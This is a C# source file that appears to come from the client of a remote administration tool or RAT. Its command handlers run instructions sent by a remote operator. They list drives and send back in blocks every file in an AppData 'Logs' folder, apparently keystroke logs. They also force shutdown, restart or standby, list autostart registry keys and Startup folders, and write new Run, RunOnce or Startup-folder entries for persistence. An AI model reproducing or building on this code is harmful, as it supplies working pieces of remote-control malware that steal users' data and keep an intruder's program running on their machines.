using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Core.Helper;
using xClient.Core.Information;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
        {
            new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
        }

        public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";

                    if (!Directory.Exists(path))
                    {
                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                            new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Packets.ClientPackets.GetLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                                //Thread.Sleep(200);
                            }
                            else
                                new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }

        public static void HandleAction(Packets.ServerPackets.Action command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Mode)
                {
                    case 0:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 1:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case 2:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch
            {
                new Packets.ClientPackets.Status("Action failed!").Execute(client);
            }
        }

        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
        {
            try
            {
                Dictionary<string, int> startupItems = new Dictionary<string, int>();

                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
                    }
                }
                using (
                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false)
                    )
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
                    }
                }
                using (
                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                        false))
                {
                    if (key != null)
                    {
                        foreach (var k in key.GetValueNames())
                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
                    }
                }
                if (OSInfo.Bits == 64)
                {
                    using (
                        var key =
                            Registry.CurrentUser.OpenSubKey(
                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
                                false))
                    {
                        if (key != null)
                        {
                            foreach (var k in key.GetValueNames())
                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 4);
                        }
                    }
                    using (
                        var key =
                            Registry.CurrentUser.OpenSubKey(
                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                                false))
                    {
                        if (key != null)
                        {
                            foreach (var k in key.GetValueNames())
                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 5);
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files =
                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
                    foreach (var file in files)
                    {
                        if (file.Name != "desktop.ini")
                            startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 6);
                    }
                }

                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch
            {
                new Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
            }
        }

        public static void HandleAddStartupItem(Packets.ServerPackets.AddStartupItem command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 1:
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 2:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 3:
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                        {
                            if (key == null) throw new Exception();
                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                command.Path = "\"" + command.Path + "\"";
                            key.SetValue(command.Name, command.Path);
                        }
                        break;
                    case 4:
                        if (
                            !Directory.Exists(
                                Path.Combine(
                                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                            throw new Exception();

                        string lnkPath =
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                    case 5:
                        if (
                            !Directory.Exists(
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
                            throw new Exception();

                        string lnkPath2 =
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath2, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch
            {
                new Packets.ClientPackets.Status("Adding Autostart Item failed!").Execute(client);
            }
        }
    }
}